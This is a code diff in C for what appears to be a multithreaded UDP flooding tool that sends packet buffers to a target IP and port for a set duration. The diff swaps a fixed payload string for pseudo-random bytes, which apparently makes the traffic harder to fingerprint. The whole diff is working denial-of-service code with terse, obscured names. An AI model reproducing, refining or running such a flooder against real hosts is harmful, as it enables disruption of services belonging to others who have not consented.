@@ -22,6 +22,14 @@ volatile int run = 1;
 
 void sig(int s) { run = 0; }
 
+void rnd(char *p, int s) {
+    int i, r = time(0);
+    for(i=0; i<s; i++) {
+        r = r * 1103515245 + 12345;
+        p[i] = (r >> 16) & 255;
+    }
+}
+
 void *wk(void *a) {
     p_t *p = (p_t*)a;
     int s = socket(2,2,17);
@@ -32,15 +40,8 @@ void *wk(void *a) {
     t.sin_port = htons(p->pt);
     t.sin_addr.s_addr = inet_addr(p->ip);
     
-    // Custom payload
     char m[65536];
-    char custom_payload[] = "21736499D9343B9A3254F79E";
-    int payload_len = strlen(custom_payload);
-    
-    // Fill the buffer with custom payload repeated
-    for(int i = 0; i < p->sz; i++) {
-        m[i] = custom_payload[i % payload_len];
-    }
+    rnd(m, p->sz);
     
     time_t e = time(0) + p->dur;
     while(time(0) < e && run) {
